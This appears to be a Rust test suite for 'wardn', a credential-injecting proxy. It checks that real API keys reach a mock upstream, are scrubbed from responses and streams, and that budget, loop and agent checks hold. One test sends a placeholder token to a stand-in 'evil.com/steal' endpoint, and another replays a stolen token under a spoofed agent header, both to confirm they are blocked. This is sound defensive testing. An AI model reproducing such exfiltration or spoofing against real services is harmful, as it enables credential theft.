//! True end-to-end proxy tests: a placeholder token goes in, a mock upstream
//! server actually receives the real credential, and the real credential is
//! stripped back out of the response before it reaches the caller.
//!
//! Unlike `tests/proxy_tests.rs` (which only asserts wardn doesn't return a
//! 403/429, since there's no real upstream to talk to), these tests stand up
//! a `wiremock` server as the upstream and inspect what it actually received.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Instant;

use axum::body::Body;
use axum::http::{Request, StatusCode};
use tokio::sync::RwLock;
use tower::ServiceExt;
use wiremock::matchers::{body_string_contains, header, method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

use wardn::config::{CredentialConfig, WardenConfig};
use wardn::proxy::audit::AuditLog;
use wardn::proxy::budget::BudgetTracker;
use wardn::proxy::loop_guard::LoopGuard;
use wardn::proxy::rate_limit::RateLimiter;
use wardn::proxy::{self, ProxyState};
use wardn::Vault;

/// Build a ProxyState whose `upstreams` map points the given provider slug
/// at the wiremock server, with one credential configured for `domain`
/// (the mock server's own host:port).
async fn state_with_upstream(
    mock_server: &MockServer,
    slug: &str,
    cred_name: &str,
    cred_value: &str,
    agent: &str,
) -> (Arc<ProxyState>, String) {
    let domain = mock_server
        .uri()
        .strip_prefix("http://")
        .unwrap()
        .to_string();
    let host_only = domain.split(':').next().unwrap().to_string();

    let mut vault = Vault::ephemeral();
    vault
        .set_with_config(
            cred_name,
            cred_value,
            &CredentialConfig {
                scrub_patterns: Vec::new(),
                oauth: None,
                budget: None,
                allowed_agents: vec![agent.to_string()],
                allowed_domains: vec![host_only],
                rate_limit: None,
            },
        )
        .unwrap();

    let placeholder = vault.get_placeholder(cred_name, agent).unwrap().to_string();

    let mut upstreams = HashMap::new();
    upstreams.insert(slug.to_string(), mock_server.uri());

    let config = WardenConfig {
        upstreams,
        ..WardenConfig::default()
    };

    let state = Arc::new(ProxyState {
        vault: Arc::new(RwLock::new(vault)),
        rate_limiter: Arc::new(tokio::sync::Mutex::new(RateLimiter::new())),
        budget_tracker: Arc::new(tokio::sync::Mutex::new(BudgetTracker::new())),
        loop_guard: Arc::new(tokio::sync::Mutex::new(LoopGuard::default())),
        audit: Arc::new(std::sync::Mutex::new(AuditLog::new())),
        config,
        host: "127.0.0.1".to_string(),
        port: 7777,
        started_at: Instant::now(),
        http_client: reqwest::Client::new(),
    });

    (state, placeholder)
}

#[tokio::test]
async fn test_e2e_header_placeholder_resolves_to_real_key_at_upstream() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "testapi",
        "OPENAI_KEY",
        "sk-proj-real-key-123456",
        "agent-1",
    )
    .await;

    // The upstream only matches if it actually received the REAL key, not
    // the placeholder.
    Mock::given(method("POST"))
        .and(path("/v1/chat/completions"))
        .and(header("authorization", "Bearer sk-proj-real-key-123456"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({"ok": true})))
        .mount(&mock_server)
        .await;

    let app = proxy::build_router(state);

    // Simulate a base-URL-redirected client: Host points at the proxy
    // itself (as it would after `ANTHROPIC_BASE_URL=http://127.0.0.1:7777/testapi`),
    // and the provider prefix in the path is what actually selects the
    // upstream.
    let req = Request::builder()
        .method("POST")
        .uri("/testapi/v1/chat/completions")
        .header("host", "127.0.0.1:7777")
        .header("x-warden-agent", "agent-1")
        .header("authorization", format!("Bearer {placeholder}"))
        .body(Body::from(r#"{"model":"gpt-4"}"#))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // Confirm the mock server really did receive exactly one matching
    // request (i.e. the real key, not the placeholder or nothing).
    let received = mock_server.received_requests().await.unwrap();
    assert_eq!(received.len(), 1);
    assert_eq!(
        received[0].headers.get("authorization").unwrap(),
        "Bearer sk-proj-real-key-123456"
    );
}

#[tokio::test]
async fn test_e2e_body_placeholder_resolves_to_real_key_at_upstream() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "testapi",
        "SOME_KEY",
        "super-secret-body-value-999",
        "agent-1",
    )
    .await;

    Mock::given(method("POST"))
        .and(path("/v1/items"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({"ok": true})))
        .mount(&mock_server)
        .await;

    let app = proxy::build_router(state);

    let body = format!(r#"{{"api_key": "{placeholder}", "prompt": "hi"}}"#);
    let req = Request::builder()
        .method("POST")
        .uri("/testapi/v1/items")
        .header("host", "127.0.0.1:7777")
        .header("x-warden-agent", "agent-1")
        .header("content-type", "application/json")
        .body(Body::from(body))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    let received = mock_server.received_requests().await.unwrap();
    assert_eq!(received.len(), 1);
    let body_str = String::from_utf8(received[0].body.clone()).unwrap();
    assert!(body_str.contains("super-secret-body-value-999"));
    assert!(!body_str.contains("wdn_placeholder_"));
}

#[tokio::test]
async fn test_e2e_response_body_leak_is_stripped_back_to_placeholder() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "testapi",
        "OPENAI_KEY",
        "sk-proj-real-key-123456",
        "agent-1",
    )
    .await;

    // Upstream "accidentally" echoes the real key back in an error body —
    // exactly the scenario strip.rs exists to defend against.
    Mock::given(method("POST"))
        .and(path("/v1/chat/completions"))
        .respond_with(ResponseTemplate::new(401).set_body_json(serde_json::json!({
            "error": "invalid key: sk-proj-real-key-123456"
        })))
        .mount(&mock_server)
        .await;

    let app = proxy::build_router(state);

    let req = Request::builder()
        .method("POST")
        .uri("/testapi/v1/chat/completions")
        .header("host", "127.0.0.1:7777")
        .header("x-warden-agent", "agent-1")
        .header("authorization", format!("Bearer {placeholder}"))
        .body(Body::from(r#"{"model":"gpt-4"}"#))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);

    let body_bytes = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
        .await
        .unwrap();
    let body_str = String::from_utf8(body_bytes.to_vec()).unwrap();

    assert!(
        !body_str.contains("sk-proj-real-key-123456"),
        "real key leaked to the client: {body_str}"
    );
    assert!(body_str.contains(&placeholder));
}

#[tokio::test]
async fn test_e2e_sse_stream_is_forwarded_and_stripped() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "testapi",
        "OPENAI_KEY",
        "sk-proj-real-key-123456",
        "agent-1",
    )
    .await;

    let sse_body = concat!(
        "event: token\ndata: {\"text\": \"hello\"}\n\n",
        "event: token\ndata: {\"leaked\": \"sk-proj-real-key-123456\"}\n\n",
        "event: done\ndata: {}\n\n",
    );

    Mock::given(method("POST"))
        .and(path("/v1/chat/completions"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_raw(sse_body, "text/event-stream")
                .insert_header("cache-control", "no-cache"),
        )
        .mount(&mock_server)
        .await;

    let app = proxy::build_router(state);

    let req = Request::builder()
        .method("POST")
        .uri("/testapi/v1/chat/completions")
        .header("host", "127.0.0.1:7777")
        .header("x-warden-agent", "agent-1")
        .header("authorization", format!("Bearer {placeholder}"))
        .body(Body::from(r#"{"model":"gpt-4","stream":true}"#))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(
        resp.headers().get("content-type").unwrap(),
        "text/event-stream"
    );

    let body_bytes = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
        .await
        .unwrap();
    let body_str = String::from_utf8(body_bytes.to_vec()).unwrap();

    assert!(
        !body_str.contains("sk-proj-real-key-123456"),
        "real key leaked in SSE stream: {body_str}"
    );
    assert!(body_str.contains(&placeholder));
    assert!(
        body_str.contains("hello"),
        "unrelated SSE content should still forward"
    );
    assert!(body_str.contains("event: done"));
}

#[tokio::test]
async fn test_e2e_domain_not_allowed_never_reaches_upstream() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "testapi",
        "OPENAI_KEY",
        "sk-proj-real-key-123456",
        "agent-1",
    )
    .await;

    // Any request reaching the mock server at all is a failure for this test.
    Mock::given(method("POST"))
        .respond_with(ResponseTemplate::new(200))
        .expect(0)
        .mount(&mock_server)
        .await;

    let app = proxy::build_router(state);

    // "otherapi" isn't a configured upstream slug, so this falls back to
    // Host-header routing — straight to evil.com, which the credential
    // isn't allowed to talk to.
    let req = Request::builder()
        .method("POST")
        .uri("https://evil.com/steal")
        .header("host", "evil.com")
        .header("x-warden-agent", "agent-1")
        .header("authorization", format!("Bearer {placeholder}"))
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);

    mock_server.verify().await;
}

#[tokio::test]
async fn test_e2e_budget_blocks_after_spend_from_real_response_usage() {
    use wardn::config::{BudgetConfig, BudgetMode, BudgetWindow};

    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "anthropic",
        "ANTHROPIC_KEY",
        "sk-ant-real-key-budget-test",
        "agent-1",
    )
    .await;

    // A budget so small that ANY nonzero recorded spend exceeds it.
    {
        let mut vault = state.vault.write().await;
        vault
            .set_budget(
                "ANTHROPIC_KEY",
                Some(BudgetConfig {
                    max_usd: 0.000001,
                    window: BudgetWindow::Day,
                    mode: BudgetMode::Hard,
                }),
            )
            .unwrap();
    }

    // The mock reports real usage — this is what the proxy should parse to
    // compute and record actual spend after the response completes.
    Mock::given(method("POST"))
        .and(path("/v1/messages"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "model": "claude-sonnet-5",
            "usage": {"input_tokens": 1000, "output_tokens": 1000}
        })))
        .mount(&mock_server)
        .await;

    let make_req = || {
        Request::builder()
            .method("POST")
            .uri("/anthropic/v1/messages")
            .header("host", "127.0.0.1:7777")
            .header("x-warden-agent", "agent-1")
            .header("authorization", format!("Bearer {placeholder}"))
            .body(Body::from(r#"{"model":"claude-sonnet-5"}"#))
            .unwrap()
    };

    // First request: budget starts at $0 spent vs a ~$0 cap, so it's not
    // YET exceeded — it should go through and its cost gets recorded
    // afterward from the response's reported usage.
    let resp1 = proxy::build_router(state.clone())
        .oneshot(make_req())
        .await
        .unwrap();
    assert_eq!(resp1.status(), StatusCode::OK);
    // Drain the body — the post-response cost-recording logic runs at the
    // tail of the stream, so it must be fully consumed for spend to land.
    let _ = axum::body::to_bytes(resp1.into_body(), 1024 * 1024)
        .await
        .unwrap();

    // Give the budget tracker's record_spend a beat to run — it happens at
    // the end of the same stream we just drained, but as a safety margin
    // against any scheduling nondeterminism.
    tokio::task::yield_now().await;

    // Second request: the recorded spend from the first request's usage
    // now exceeds the near-zero cap, so this one must be blocked.
    let resp2 = proxy::build_router(state.clone())
        .oneshot(make_req())
        .await
        .unwrap();
    assert_eq!(resp2.status(), StatusCode::PAYMENT_REQUIRED);

    let body = axum::body::to_bytes(resp2.into_body(), 1024 * 1024)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();
    assert_eq!(json["error"], "budget_exceeded");
    assert_eq!(json["credential"], "ANTHROPIC_KEY");
}

#[tokio::test]
async fn test_e2e_loop_guard_blocks_repeated_identical_request() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "anthropic",
        "ANTHROPIC_KEY",
        "sk-ant-real-key-loop-test",
        "agent-1",
    )
    .await;

    Mock::given(method("POST"))
        .and(path("/v1/messages"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({"ok": true})))
        .mount(&mock_server)
        .await;

    let make_req = || {
        Request::builder()
            .method("POST")
            .uri("/anthropic/v1/messages")
            .header("host", "127.0.0.1:7777")
            .header("x-warden-agent", "agent-1")
            .header("authorization", format!("Bearer {placeholder}"))
            // Identical body every time — a stuck retry loop.
            .body(Body::from(r#"{"model":"claude-sonnet-5","prompt":"same"}"#))
            .unwrap()
    };

    // Default threshold is 5 identical requests within the window.
    let mut last_status = StatusCode::OK;
    for _ in 0..5 {
        let resp = proxy::build_router(state.clone())
            .oneshot(make_req())
            .await
            .unwrap();
        last_status = resp.status();
        if last_status == StatusCode::TOO_MANY_REQUESTS {
            let body = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
                .await
                .unwrap();
            let json: serde_json::Value = serde_json::from_slice(&body).unwrap();
            assert_eq!(json["error"], "loop_detected");
            assert_eq!(json["agent"], "agent-1");
            return;
        }
    }

    panic!(
        "expected loop detection to trip within 5 identical requests, last status: {last_status}"
    );
}

#[tokio::test]
async fn test_e2e_loop_guard_does_not_trip_on_varied_requests() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "anthropic",
        "ANTHROPIC_KEY",
        "sk-ant-real-key-varied-test",
        "agent-1",
    )
    .await;

    Mock::given(method("POST"))
        .and(path("/v1/messages"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({"ok": true})))
        .mount(&mock_server)
        .await;

    // Same agent, but a DIFFERENT body each time — a legitimate varied
    // workload must never trip the loop guard, no matter how many requests.
    for i in 0..8 {
        let req = Request::builder()
            .method("POST")
            .uri("/anthropic/v1/messages")
            .header("host", "127.0.0.1:7777")
            .header("x-warden-agent", "agent-1")
            .header("authorization", format!("Bearer {placeholder}"))
            .body(Body::from(format!(
                r#"{{"model":"claude-sonnet-5","prompt":"request number {i}"}}"#
            )))
            .unwrap();

        let resp = proxy::build_router(state.clone())
            .oneshot(req)
            .await
            .unwrap();
        assert_ne!(
            resp.status(),
            StatusCode::TOO_MANY_REQUESTS,
            "varied requests must never trip loop detection (request {i})"
        );
    }
}

#[tokio::test]
async fn test_e2e_stolen_placeholder_rejected_under_spoofed_agent_claim() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "anthropic",
        "ANTHROPIC_KEY",
        "sk-ant-real-key-owner-test",
        "real-owner",
    )
    .await;

    Mock::given(method("POST"))
        .respond_with(ResponseTemplate::new(200))
        .mount(&mock_server)
        .await;

    let app = proxy::build_router(state);

    // The placeholder was issued to "real-owner", but this request claims
    // to be "attacker" — simulating a leaked/copied token replayed under a
    // spoofed x-warden-agent header.
    let req = Request::builder()
        .method("POST")
        .uri("/anthropic/v1/messages")
        .header("host", "127.0.0.1:7777")
        .header("x-warden-agent", "attacker")
        .header("authorization", format!("Bearer {placeholder}"))
        .body(Body::from(r#"{"model":"claude-sonnet-5"}"#))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_ne!(resp.status(), StatusCode::FORBIDDEN);

    // The request DOES reach the upstream (wardn forwards unrecognized
    // content rather than erroring) — but it must carry the placeholder
    // verbatim, never the real key, since the agent claim didn't match.
    let received = mock_server.received_requests().await.unwrap();
    assert_eq!(received.len(), 1);
    let auth = received[0]
        .headers
        .get("authorization")
        .unwrap()
        .to_str()
        .unwrap();
    assert_eq!(auth, format!("Bearer {placeholder}"));
    assert!(!auth.contains("sk-ant-real-key-owner-test"));
}

#[tokio::test]
async fn test_e2e_oauth_token_refreshed_before_injection() {
    use wardn::config::OAuthConfig;

    let token_server = MockServer::start().await;
    let api_server = MockServer::start().await;

    // The token endpoint hands out a fresh access token.
    Mock::given(method("POST"))
        .and(path("/token"))
        .and(body_string_contains("refresh_token=stale-refresh-token"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "access_token": "brand-new-access-token",
            "refresh_token": "rotated-refresh-token",
            "expires_in": 3600
        })))
        .mount(&token_server)
        .await;

    // The real API only accepts the NEW token — proves the proxy refreshed
    // before injecting, not the stale value the credential started with.
    Mock::given(method("POST"))
        .and(path("/v1/messages"))
        .and(header("authorization", "Bearer brand-new-access-token"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({"ok": true})))
        .mount(&api_server)
        .await;

    let mut vault = Vault::ephemeral();
    vault.set("ANTHROPIC_KEY", "stale-access-token").unwrap();
    vault
        .set_oauth_config(
            "ANTHROPIC_KEY",
            Some(OAuthConfig {
                token_url: format!("{}/token", token_server.uri()),
                client_id: "client-1".to_string(),
                client_secret: None,
                refresh_token: "stale-refresh-token".to_string(),
                expires_at: Some(0), // already expired — must refresh
            }),
        )
        .unwrap();
    let placeholder = vault
        .get_placeholder("ANTHROPIC_KEY", "agent-1")
        .unwrap()
        .to_string();

    let mut upstreams = HashMap::new();
    upstreams.insert("anthropic".to_string(), api_server.uri());
    let config = WardenConfig {
        upstreams,
        ..WardenConfig::default()
    };

    let state = Arc::new(ProxyState {
        vault: Arc::new(RwLock::new(vault)),
        rate_limiter: Arc::new(tokio::sync::Mutex::new(RateLimiter::new())),
        budget_tracker: Arc::new(tokio::sync::Mutex::new(BudgetTracker::new())),
        loop_guard: Arc::new(tokio::sync::Mutex::new(LoopGuard::default())),
        audit: Arc::new(std::sync::Mutex::new(AuditLog::new())),
        config,
        host: "127.0.0.1".to_string(),
        port: 7777,
        started_at: Instant::now(),
        http_client: reqwest::Client::new(),
    });

    let req = Request::builder()
        .method("POST")
        .uri("/anthropic/v1/messages")
        .header("host", "127.0.0.1:7777")
        .header("x-warden-agent", "agent-1")
        .header("authorization", format!("Bearer {placeholder}"))
        .body(Body::from(r#"{"model":"claude-sonnet-5"}"#))
        .unwrap();

    let resp = proxy::build_router(state.clone())
        .oneshot(req)
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // The vault's stored value and oauth state must reflect the refresh.
    let vault = state.vault.read().await;
    assert_eq!(
        vault.get("ANTHROPIC_KEY").unwrap().expose(),
        "brand-new-access-token"
    );
    let oauth = vault.oauth_config("ANTHROPIC_KEY").unwrap();
    assert_eq!(oauth.refresh_token, "rotated-refresh-token");
    assert!(oauth.expires_at.unwrap() > 0);
}

#[tokio::test]
async fn test_e2e_scrub_pattern_redacts_derived_secret_wardn_never_injected() {
    let mock_server = MockServer::start().await;
    let (state, placeholder) = state_with_upstream(
        &mock_server,
        "anthropic",
        "ANTHROPIC_KEY",
        "sk-ant-real-key-scrub-test",
        "agent-1",
    )
    .await;

    // Configure a scrub pattern on the credential — this is what makes
    // wardn redact a secret it never injected in the first place (e.g. a
    // session token this "login" endpoint generates fresh every call).
    {
        let mut vault = state.vault.write().await;
        vault
            .set_with_config(
                "ANTHROPIC_KEY",
                "sk-ant-real-key-scrub-test",
                &wardn::config::CredentialConfig {
                    scrub_patterns: vec![r"sess_[a-zA-Z0-9]{10,}".to_string()],
                    oauth: None,
                    budget: None,
                    allowed_agents: vec!["agent-1".to_string()],
                    allowed_domains: vec![],
                    rate_limit: None,
                },
            )
            .unwrap();
    }

    Mock::given(method("POST"))
        .and(path("/v1/messages"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "ok": true,
            "session": "sess_ab12cd34ef56gh78"
        })))
        .mount(&mock_server)
        .await;

    let req = Request::builder()
        .method("POST")
        .uri("/anthropic/v1/messages")
        .header("host", "127.0.0.1:7777")
        .header("x-warden-agent", "agent-1")
        .header("authorization", format!("Bearer {placeholder}"))
        .body(Body::from(r#"{"model":"claude-sonnet-5"}"#))
        .unwrap();

    let resp = proxy::build_router(state).oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    let body_bytes = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
        .await
        .unwrap();
    let body_str = String::from_utf8(body_bytes.to_vec()).unwrap();

    assert!(
        !body_str.contains("sess_ab12cd34ef56gh78"),
        "derived secret leaked to the client: {body_str}"
    );
    assert!(body_str.contains("[REDACTED]"));
}
